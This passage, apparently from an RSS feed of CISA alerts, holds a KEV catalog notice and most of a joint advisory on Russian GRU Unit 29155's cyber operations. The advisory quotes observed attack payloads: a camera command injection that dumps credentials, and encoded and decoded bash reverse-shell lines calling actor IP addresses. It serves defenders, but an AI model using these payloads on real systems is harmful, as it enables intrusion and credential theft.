<td>46.246.3.245</td>
<td>02/05/2024 to 02/06/2024</td>
</tr>
<tr>
<td>191.96.150.50</td>
<td>02/09/2024</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;15: Devices</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Device Type</th>
<th role=\"columnheader\">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Samsung Galaxy A71 (SM-A715F)</td>
<td>Registered with MFA</td>
</tr>
<tr>
<td>Samsung SM-G998B</td>
<td>Registered with MFA</td>
</tr>
<tr>
<td>Samsung SM-M205F</td>
<td>Registered with MFA</td>
</tr>
</tbody>
</table>
</div>
<p>&nbsp;</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
") (pubDate nil "Mon, 30 Sep 2024 12:28:59 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/22303"))) ("CISA Adds One Known Exploited Vulnerability to Catalog" "<p>CISA has added one new vulnerability to its&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">Known Exploited Vulnerabilities Catalog</a>, based on evidence of active exploitation.</p>
<ul>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2024-8963\" title=\"Ivanti Cloud Services Appliance (CSA) Path Traversal Vulnerability\">CVE-2024-8963</a> Ivanti Cloud Services Appliance (CSA) Path Traversal Vulnerability</li>
</ul>
<p>These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.</p>
<p><a href=\"https://www.cisa.gov/binding-operational-directive-22-01\" title=\"Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities\">Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities</a>&nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the<a>&nbsp;</a><a href=\"https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf\" title=\"BOD 22-01 Fact Sheet\">BOD 22-01 Fact Sheet</a>&nbsp;for more information.</p>
<p>Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Catalog vulnerabilities\">Catalog vulnerabilities</a>&nbsp;as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities\" title=\"specified criteria\">specified criteria</a>.</p>" "https://www.cisa.gov/news-events/alerts/2024/09/19/cisa-adds-one-known-exploited-vulnerability-catalog" (26348 2766) new 2 nil nil ((title nil "CISA Adds One Known Exploited Vulnerability to Catalog") (link nil "https://www.cisa.gov/news-events/alerts/2024/09/19/cisa-adds-one-known-exploited-vulnerability-catalog") (description nil "<p>CISA has added one new vulnerability to its&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">Known Exploited Vulnerabilities Catalog</a>, based on evidence of active exploitation.</p>
<ul>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2024-8963\" title=\"Ivanti Cloud Services Appliance (CSA) Path Traversal Vulnerability\">CVE-2024-8963</a> Ivanti Cloud Services Appliance (CSA) Path Traversal Vulnerability</li>
</ul>
<p>These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.</p>
<p><a href=\"https://www.cisa.gov/binding-operational-directive-22-01\" title=\"Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities\">Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities</a>&nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the<a>&nbsp;</a><a href=\"https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf\" title=\"BOD 22-01 Fact Sheet\">BOD 22-01 Fact Sheet</a>&nbsp;for more information.</p>
<p>Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Catalog vulnerabilities\">Catalog vulnerabilities</a>&nbsp;as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities\" title=\"specified criteria\">specified criteria</a>.</p>
") (pubDate nil "Thu, 19 Sep 2024 11:28:14 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/22256"))) ("Russian Military Cyber Actors Target US and Global Critical Infrastructure" "<h2><strong>Summary</strong></h2>
<p>The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and National Security Agency (NSA) assess that cyber actors affiliated with the Russian General Staff Main Intelligence Directorate (GRU) 161st Specialist Training Center (Unit 29155) are responsible for computer network operations against global targets for the purposes of espionage, sabotage, and reputational harm since at least 2020. GRU Unit 29155 cyber actors began deploying the destructive&nbsp;<a href=\"https://attack.mitre.org/software/S0689/\" title=\"WhisperGate\">WhisperGate</a> malware against multiple Ukrainian victim organizations as early as January 13, 2022. These cyber actors are separate from other known and more established GRU-affiliated cyber groups, such as Unit 26165 and Unit 74455.</p>
<p>To mitigate this malicious cyber activity, organizations should take the following actions today:</p>
<ul>
<li>Prioritize routine system updates and remediate known exploited vulnerabilities.</li>
<li>Segment networks to prevent the spread of malicious activity.</li>
<li>Enable phishing-resistant multifactor authentication (MFA) for all externally facing account services, especially for webmail, virtual private networks (VPNs), and accounts that access critical systems.</li>
</ul>
<p>This Cybersecurity Advisory provides tactics, techniques, and procedures (TTPs) associated with Unit 29155 cyber actors<a>—</a>both during and succeeding their deployment of WhisperGate against Ukraine—as well as further analysis (see <strong>Appendix A</strong>) of the WhisperGate malware initially published in the joint advisory,&nbsp;<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a\" title=\"Destructive Malware Targeting Organizations in Ukraine\">Destructive Malware Targeting Organizations in Ukraine</a>, published February 26, 2022.</p>
<p>FBI, CISA, NSA and the following partners are releasing this joint advisory as a collective assessment of Unit 29155 cyber operations since 2020:</p>
<ul>
<li>U.S. Department of the Treasury</li>
<li>U.S. Department of State (Rewards for Justice)</li>
<li>U.S. Cyber Command Cyber National Mission Force (CNMF)</li>
<li>Netherlands Defence Intelligence and Security Service (MIVD)</li>
<li>Czech Military Intelligence (VZ)</li>
<li>Czech Republic Security Information Service (BIS)</li>
<li>German Federal Office for the Protection of the Constitution (BfV)</li>
<li>Estonian Internal Security Service (KAPO)</li>
<li>Latvian State Security Service (VDD)</li>
<li>Security Service of Ukraine (SBU)</li>
<li>Computer Emergency Response Team of Ukraine (CERT-UA)</li>
<li>Canadian Security Intelligence Service (CSIS)</li>
<li>Communications Security Establishment Canada (CSE)</li>
<li>Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC)</li>
<li>United Kingdom National Cyber Security Centre (NCSC-UK)</li>
</ul>
<p>For additional information on Russian state-sponsored malicious cyber activity and related indictments, see the recent U.S. Department of Justice (DOJ) press releases for&nbsp;<a href=\"https://www.justice.gov/opa/pr/russian-national-charged-conspiring-russia-military-intelligence-destroy-ukrainian\" title=\"Russian National Charged for Conspiring with Russian Military Intelligence to Destroy Ukrainian Government Computer Systems and Data\">June 26, 2024</a>, and&nbsp;<a href=\"https://www.justice.gov/opa/pr/five-russian-gru-officers-and-one-civilian-charged-conspiring-hack-ukrainian-government\" title=\"Five Russian GRU Officers and One Civilian Charged for Conspiring to Hack Ukrainian Government\">September 5, 2024</a>, FBI’s&nbsp;<a href=\"https://www.fbi.gov/investigate/cyber\" title=\"The Cyber Threat\">Cyber Crime</a> webpage, and CISA’s&nbsp;<a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/russia\" title=\"Russia Cyber Threat Overview and Advisories\">Russia Cyber Threat Overview and Advisories</a> webpage.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/aa24-249a-russian-military-cyber-actors-target-us-and-global-critical-infrastructure.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-249A Russian Military Cyber Actors Target U.S. and Global Critical Infrastructure</a>
    <span class=\"c-file__size\">(PDF,       1.01 MB
  )</span>
  </div>
</div>
<p>For a downloadable copy of indicators of compromise (IOCs):</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/AA24-249A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-249A STIX XML</a>
    <span class=\"c-file__size\">(XML,       321.47 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/AA24-249A-Russian-Military-Cyber-Actors-Target-US-and-Global-Critical-Infrastructure.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-249A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       201.39 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK® Matrix for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>
<h3>GRU Unit 29155: Cyber Component</h3>
<p>FBI, NSA, and CISA assess Unit 29155 is responsible for attempted coups, sabotage and influence operations, and assassination attempts throughout Europe. Unit 29155 expanded their tradecraft to include offensive cyber operations since at least 2020. Unit 29155 cyber actors’ objectives appear to include the collection of information for espionage purposes, reputational harm caused by the theft and leakage of sensitive information, and systematic sabotage caused by the destruction of data [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1485/\" title=\"Data Destruction\">T1485</a>].</p>
<p>FBI assesses the Unit 29155 cyber actors to be junior active-duty GRU officers under the direction of experienced Unit 29155 leadership. These individuals appear to be gaining cyber experience and enhancing their technical skills through conducting cyber operations and intrusions. Additionally, FBI assesses Unit 29155 cyber actors rely on non-GRU actors, including known cyber-criminals and enablers to conduct their operations.</p>
<h3>Cybersecurity Industry Tracking</h3>
<p>The cybersecurity industry provides overlapping cyber threat intelligence, IOCs, and mitigation recommendations related to Unit 29155 cyber actors. While not all encompassing, the following are the most notable threat group names related under <a href=\"https://attack.mitre.org/groups/G1003\" title=\"Ember Bear\">MITRE ATT&amp;CK G1003</a>&nbsp;and commonly used within the cybersecurity community.</p>
<ul>
<li>Cadet Blizzard (formerly known as DEV-0586 by Microsoft)[<a href=\"https://www.microsoft.com/en-us/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/\" title=\"Destructive malware targeting Ukrainian organizations\">1</a>],[<a href=\"https://www.microsoft.com/en-us/security/blog/2023/06/14/cadet-blizzard-emerges-as-a-novel-and-distinct-russian-threat-actor/?msockid=2383e2d882c06a751a17f64383d26b64\" title=\"Cadet Blizzard emerges as a novel and distinct Russian threat actor\">2</a>]</li>
<li>Ember Bear (also known as Bleeding Bear by CrowdStrike)[<a href=\"https://www.crowdstrike.com/blog/who-is-ember-bear/\" title=\"Who is EMBER BEAR?\">3</a>]</li>
<li>Frozenvista</li>
<li>UNC2589[<a href=\"https://cloud.google.com/blog/topics/threat-intelligence/russia-invasion-ukraine-retaliation/\" title=\"Responses to Russia's Invasion of Ukraine Likely to Spur Retaliation\">4</a>]</li>
<li>UAC-0056[<a href=\"https://www.sentinelone.com/blog/threat-actor-uac-0056-targeting-ukraine-with-fake-translation-software/\">5</a>]</li>
</ul>
<p><strong>Note:</strong> Cybersecurity companies have different methods of tracking and attributing cyber actors, and this may not be a 1:1 correlation to the U.S. Government’s understanding for all activity related to these groupings.</p>
<h3>Victimization</h3>
<p>In addition to WhisperGate and other incidents against Ukraine, Unit 29155 cyber actors have conducted computer network operations against numerous members of the North Atlantic Treaty Organization (NATO) in Europe and North America, as well as countries in Europe, Latin America, and Central Asia. The activity includes cyber campaigns such as website defacements, infrastructure scanning, data exfiltration, and data leak operations. These actors sell or publicly release exfiltrated victim data obtained from their compromises. Since early 2022, the primary focus of the cyber actors appears to be targeting and disrupting efforts to provide aid to Ukraine.</p>
<p>To date, the FBI has observed more than 14,000 instances of domain scanning across at least 26 NATO members and several additional European Union (EU) countries. Unit 29155 cyber actors have defaced victim websites and used public website domains to post exfiltrated victim information.</p>
<p>Whether through offensive operations or scanning activity, Unit 29155 cyber actors are known to target critical infrastructure and key resource sectors, including the government services, financial services, transportation systems, energy, and healthcare sectors of NATO members, the EU, Central American, and Asian countries.</p>
<h3>TTP Overview</h3>
<h4><strong>Reconnaissance</strong></h4>
<p>Unit 29155 cyber actors have been observed targeting IP ranges [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/001/\" title=\"Active Scanning: Scanning IP Blocks\">T1595.001</a>] used within multiple government and critical infrastructure organizations. The following are publicly available tools these cyber actors have used for scanning [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/\" title=\"Active Scanning\">T1595</a>] and vulnerability exploit efforts. Unit 29155 cyber actors were not observed using these tools outside of their intended purpose. <strong>Note:&nbsp;</strong>Use of these tools should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>
<ul>
<li><strong>Acunetix:</strong> Unit 29155 cyber actors leveraged both Acunetix and Nmap to identify open ports, services, and vulnerabilities for networks [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/002/\" title=\"Active Scanning: Vulnerability Scanning\">T1595.002</a>].[<a href=\"https://www.acunetix.com/support/docs/introduction/\" title=\"Introduction to Acunetix\">6</a>]</li>
<li><strong>Amass:</strong> Unit 29155 cyber actors leveraged both Amass and VirusTotal to obtain subdomains for target websites [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1590/002/\" title=\"Gather Victim Network Information: DNS\">T1590.002</a>].[<a href=\"https://github.com/owasp-amass/amass\" title=\"owasp-amass / amass\">7</a>]</li>
<li><strong>Droopescan</strong>[<a href=\"https://kalilinuxtutorials.com/droopescan/\" title=\"Droopescan : A Plugin-Based Scanner That Aids Security Researchers\">8</a>]</li>
<li><strong>JoomScan</strong>[<a href=\"https://github.com/OWASP/joomscan\" title=\"OWASP / joomscan\">9</a>]</li>
<li><strong>MASSCAN:</strong> Unit 29155 cyber actors used MASSCAN and Nmap to discover other machines once inside victim networks.[<a href=\"https://www.kali.org/tools/masscan/\" title=\"Masscan\">10</a>]</li>
<li><strong>Netcat</strong>[<a href=\"https://www.digitalocean.com/community/tutorials/how-to-use-netcat-to-establish-and-test-tcp-and-udp-connections\" title=\"How To Use Netcat to Establish and Test TCP and UDP Connections\">11</a>]</li>
<li><strong>Nmap:</strong> Once Unit 29155 cyber actors gained access to victim internal networks, they further used Nmap (via the Nmap Scripting Engine [NSE]) to write custom scripts for discovering and scanning other machines [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a>].</li>
<li><strong>Shodan:</strong> Unit 29155 cyber actors used Shodan to identify hosts with a specific set of vulnerabilities or device types [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/005/\" title=\"Search Open Technical Databases: Scan Databases\">T1596.005</a>].[<a href=\"https://help.shodan.io/the-basics/what-is-shodan\" title=\"What is Shodan?\">12</a>]</li>
<li><strong>VirusTotal</strong>[<a href=\"https://docs.virustotal.com/docs/how-it-works\" title=\"How it works\">13</a>]</li>
<li><strong>WPScan</strong></li>
</ul>
<p>Additionally, Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>] over port 1194, and in some instances, to perform Active Directory (AD) enumeration<a>. </a>Adminer in combination with <a href=\"https://attack.mitre.org/versions/v15/software/S0357/\" title=\"Impacket\">Impacket</a> and ldapdomaindump were tools used for gathering information on AD. Once active devices are found, Unit 29155 cyber actors look for vulnerabilities to exploit. For example, the Acunetix vulnerability scanning tool has been used for gathering information on potential vulnerabilities such as blind cross-site scripting, as shown in the following commands:</p>
<p><code>GET /index.php?log=to@example.com&gt;%0d%0abcc:009247.3183-377.3183.1bf6c.19446.2@bxss.me</code></p>
<p><code>\"GET /CMS/files/log.htm HTTP/1.1\" * * \"(nslookup hitccruvbrumn76c1b.bxss.me||perl -e \\\"gethostbyname('hitccruvbrumn76c1b.bxss.me')\\\")\"</code></p>
<p>As the cyber actors perform reconnaissance on victim networks and discover vulnerabilities within victim web servers or machines, they obtain CVE exploit scripts from GitHub repositories and use them against victim infrastructure [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/005/\">T1588.005</a>]. Unit 29155 cyber actors have been observed obtaining the respective exploit scripts for, but not exploiting,<strong> </strong>the following CVEs:</p>
<ul>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-1472\" title=\"CVE-2020-1472 Detail\">CVE-2020-1472</a> (Microsoft: Windows Server)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-26084\" title=\"CVE-2021-26084 Detail\">CVE-2021-26084</a> (Atlassian Confluence Server and Data Center)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3156\" title=\"CVE-2021-3156 Detail\">CVE-2021-3156</a> (Red Hat: Privilege Escalation via Command Line Argument Parsing)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-4034\" title=\"CVE-2021-4034 Detail\">CVE-2021-4034</a> (Red Hat: Polkit Privilege Escalation)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-27666\" title=\"CVE-2022-27666 Detail\">CVE-2022-27666</a> (Red Hat: Heap Buffer Overflow Flaw)</li>
</ul>
<p>Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\">T1190</a>], as detailed throughout this advisory:</p>
<ul>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-33044\" title=\"CVE-2021-33044 Detail\">CVE-2021-33044</a> (Dahua Security)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-33045\" title=\"CVE-2021-33045 Detail\">CVE-2021-33045</a> (Dahua Security)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-26134\" title=\"CVE-2022-26134 Detail\">CVE-2022-26134</a> (Atlassian Confluence Server and Data Center)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-26138\" title=\"CVE-2022-26138 Detail\">CVE-2022-26138</a> (Atlassian Confluence Server and Data Center)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-3236\" title=\"CVE-2022-3236 Detail\">CVE-2022-3236</a> (Sophos: Firewall)</li>
</ul>
<h4><strong>Resource Development</strong></h4>
<p>Rather than build custom solutions, Unit 29155 cyber actors use common red teaming techniques and publicly available tools to conduct cyber operations. As a result, many TTPs overlap with those of other cyber actors, which can lead to misattribution.</p>
<p>Unit 29155 actors and their cyber-criminal affiliates commonly maintain accounts on dark web forums; this has provided the opportunity to obtain various hacker tools such as malware and malware loaders [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/001/\" title=\"Obtain Capabilities: Malware\">T1588.001</a>] like Raspberry Robin and SaintBot. While Unit 29155 cyber actors are best known for their use of WhisperGate malware against Ukraine, the use of WhisperGate is not unique to the group. Technical analysis can be found in <strong>Appendix A: WhisperGate Malware Analysis</strong>.</p>
<h4><strong>Initial Access</strong></h4>
<p>Unit 29155 cyber actors are known to use VPNs to anonymize their operational activity. These cyber actors commonly attempt to exploit weaknesses in internet-facing systems, like the CVEs listed above, to initially access networks. In one instance, Unit 29155 cyber actors exploited CVE-2021-33044 and CVE-2021-33045 on Dahua IP cameras to bypass identity authentication.</p>
<h4><strong>Lateral Movement</strong></h4>
<p>Unit 29155 cyber actors have used Shodan to scan for Internet of Things (IoT) devices, using exploitation scripts to authenticate to IP cameras with default usernames and passwords [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/001/\" title=\"Valid Accounts: Default Accounts\">T1078.001</a>], and exfiltrating images [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1125/\" title=\"Video Capture\">T1125</a>] (JPG files). Attempts are then made to perform remote command execution via web to vulnerable IP cameras; if successful, cyber actors would dump configuration settings and credentials in plaintext (as shown in <strong>Table 1</strong> below) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1552/001/\" title=\"Unsecured Credentials: Credentials In Files\">T1552.001</a>].</p>
<p><strong>Appendix B: Indicators of Compromise</strong> lists threat actor IP addresses associated with the activity detailed in this section.</p>
<p><strong>Note:</strong> These events are independent and not correlated as a single timeline of compromise.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Event</th>
<th role=\"columnheader\">Victim Observation</th>
</tr>
</thead>
<tbody>
<tr>
<td>Web requests observed from victim infrastructure</td>
<td>
<p>These requests are likely intended to dump configuration settings and credentials&nbsp;[<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>]:</p>
<p><code>hxxp://&lt;IP&gt;:&lt;port&gt;/PictureCatch.cgi?username=&lt;NAME&gt;&amp;password=%3becho%20%22%3c%21--%23include%20file=%22SYS_CFG%22--%3e%22%3etmp/Login.htm%3b&amp;data_type=1&amp;attachment=1&amp;channel=1&amp;secret=1&amp;key=PWNED</code></p>
<p><code>hxxp://&lt;IP&gt;:&lt;port&gt;/ssi.cgi/tmp/Login.htm</code></p>
</td>
</tr>
<tr>
<td>POST requests sent to victims with payloads [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a>]</td>
<td>
<p><code>\"txtUser=lol&amp;txtPassword=2&amp;btConnect=Piesl%C4%93gtiesbtConnect=Piesl%C4%93gties&amp;chRemember=on&amp;txtPassword=g00dPa%24%24w0rD&amp;txtUser=$%7b@print(system(%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F179.43.175.38%2F6870%200%3E%261%22))%7d\"</code></p>
<p><code>\"txtUser=lol&amp;txtPassword=2&amp;btConnect=Piesl%C4%93gtiesbtConnect=Piesl%C4%93gties&amp;chRemember=on&amp;txtPassword=g00dPa%24%24w0rD&amp;txtUser=$%7b@print(system(%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F81.17.24.130%2F6870%200%3E%261%22))%7d\"</code></p>
</td>
</tr>
<tr>
<td>URL encoded values from txtUser for both commands decoded to embedded bash commands</td>
<td>
<p><code>${@print(system(\"bash -i &gt;&amp; /dev/tcp/179.43.175.38/6870 0&gt;&amp;1\"))}</code></p>
<p><code>${@print(system(\"bash -i &gt;&amp; /dev/tcp/81.17.24.130/6870 0&gt;&amp;1\"))}</code></p>
</td>
</tr>
</tbody>
</table>
<p>In addition, incident analysis identified the general observations listed below on victim infrastructure. Each event should be considered independent and may have been used by Unit 29155 cyber actors against multiple victims at different dates and timeframes. <strong>Appendix B: Indicators of Compromise</strong> lists IOCs associated with the observations in <strong>Table 1</strong> and below.</p>
<ul>
<li>In one instance shortly following a deployment of WhisperGate malware, Unit 29155 cyber actors exfiltrated data to&nbsp;<code>mega[.]nz</code> using&nbsp;<a href=\"https://attack.mitre.org/versions/v15/software/S1040/\" title=\"Rclone\">Rclone</a> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1567/002/\" title=\"Exfiltration Over Web Service: Exfiltration to Cloud Storage\">T1567.002</a>].</li>
<li>Unit 29155 cyber actors used a Pass-the-Hash [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1550/002/\" title=\"Use Alternate Authentication Material: Pass the Hash\">T1550.002</a>] via ProxyChains.</li>
<li>Cyber actors performed SSH and SSHPass executions.</li>
<li>Cyber actors initiated a web request and executed commands via ProxyChains. This included obtaining NT hashes via Server Message Block (SMB) using smbclient, executing Windows Management Instrumentation (WMI) with hashes, and making web requests with resources <code>i.php</code> and <code>tunnel.jsp</code>. In one instance, cyber actors used smbclient via ProxyChains to access internal network shares, and subsequently PSQL and MySQL clients to access internal databases.</li>
<li>Cyber actors used Impacket for post-exploitation and lateral movement. The script <code>secretsdump.py</code> was used from the Impacket framework to obtain domain credentials, while <code>psexec.py</code> was subsequently used to move laterally within a victim network.&nbsp;</li>
<li>Cyber actors used <code>ntlmrelayx.py</code> via Impacket and <code>krbrelayx.py</code>, which requires Impacket to function.</li>
<li>Cyber actors used <code>Responder.py</code>.</li>
<li>Cyber actors used <code>su-bruteforce</code> to brute force a selected user using the <code>su</code> command.</li>
<li>Cyber actors used <a href=\"https://attack.mitre.org/software/S0521/\" title=\"BloodHound\">BloodHound</a>, an open source AD reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment.</li>
<li>Cyber actors used CrackMapExec via ProxyChains with SMB protocol targeting internal victim IP addresses. This open source post-exploitation tool automates assessing the security of large AD networks.</li>
<li>Cyber actors used <code>LinPEAS</code>, an open source script designed to automate the process of searching for potential privilege escalation vulnerabilities on a Linux victim.</li>
<li>Cyber actors used GO Simple Tunnel (GOST) (MD5: <code>896e0f54fc67d72d94b40d7885f10c51</code>) for 30 days within one incident and against additional victims on various occasions. GOST is a tunneling tool designed to establish secure connections between clients and servers, allowing for secure data transmission over untrusted networks.</li>
<li>Cyber actors used Through the Wire against a victim’s internet-facing Confluence server. Through the Wire is a proof of concept[<a href=\"https://github.com/jbaines-r7/through_the_wire\" title=\"jbaines-r7 / through_the_wire\">14</a>] exploit for CVE-2022-26134, an OGNL injection vulnerability allowing an unauthenticated user to execute arbitrary code on a Confluence Server or Data Center instance. All versions of Confluence Server and Data Center prior to the fixed versions listed by Atlassian are affected by this vulnerability.[<a href=\"https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html\" title=\"Confluence Server and Data Center - CVE-2022-26134 - Critical severity unauthenticated remote code execution vulnerability\">15</a>] A reverse shell over HTTPS was used to communicate over listening host on port <code>8081</code>.</li>
<li>Cyber actors initiated Nmap scans on localized web servers.</li>
<li>Cyber actors performed lateral movement from compromised web servers to exploit a corporate Microsoft Windows network, commonly using <code>psexec.py</code> from the Impacket framework. The script <code>secretsdump.py</code> from the Impacket framework was used to obtain domain credentials.</li>
<li>Cyber actors may have used Raspberry Robin malware in the role of an access broker [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/001/\" title=\"Obtain Capabilities: Malware\">T1588.001</a>].</li>
<li>Cyber actors targeted victims’ Microsoft Outlook Web Access (OWA) infrastructure with password spraying to obtain valid usernames and passwords [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a>].</li>
</ul>
<h3>Command and Control</h3>
<h4><strong>Infrastructure</strong></h4>
<p>Since at least 2020, Unit 29155 cyber actors have used virtual private servers (VPSs) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1583/003/\" title=\"Acquire Infrastructure: Virtual Private Server\">T1583.003</a>] to host their operational tools, perform reconnaissance, exploit victim infrastructure, and exfiltrate victim data. Use of VPSs are common due to the associated IP addresses not identifying their true country of origin.</p>
<h4><strong>Post-Exploitation</strong></h4>
<div class=\"WordSection1\">
<p>When an exploit is successfully executed on a victim system, the actors can then launch a Meterpreter payload [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a>], which commonly uses a reverse Transmission Control Protocol (TCP) connection to initiate communication with the threat actors’ infrastructure [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1095/\" title=\"Non-Application Layer Protocol\">T1095</a>]. In one instance, an established reverse TCP session was observed from victim to actor infrastructure via the following ports:</p>
<ul>
<li>1234</li>
<li>1851</li>
<li>43221</li>
<li>443</li>
<li>4444</li>
<li>4688</li>
<li>5432</li>
<li>8080</li>
<li>8081</li>
<li>8082</li>
<li>8084</li>
<li>8085</li>
<li>8088</li>
<li>8089</li>
<li>8090</li>
<li>8443</li>
<li>8487</li>
<li>8888</li>
</ul>
<p>Additional observations were collected from victim engagement and analysis, including:</p>
<ul>
<li>Use of the Metasploit Framework to search for and/or access modules such as <code>mysql</code>, <code>postgres</code>, and <code>ssh</code> software and features.</li>
<li>Use of Meterpreter and Netcat to execute reverse shells over ports such as 8081.</li>
<li>Use of Impacket.</li>
<li>Use of PHP (<code>exp_door v1.0.2</code>, <code>b374k</code>, <code>WSO 4.0.5</code>) and the <a href=\"https://attack.mitre.org/versions/v15/software/S0598/\" title=\"P.A.S. Webshell\">P.A.S.</a> web shells [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>], likely for initial access.</li>
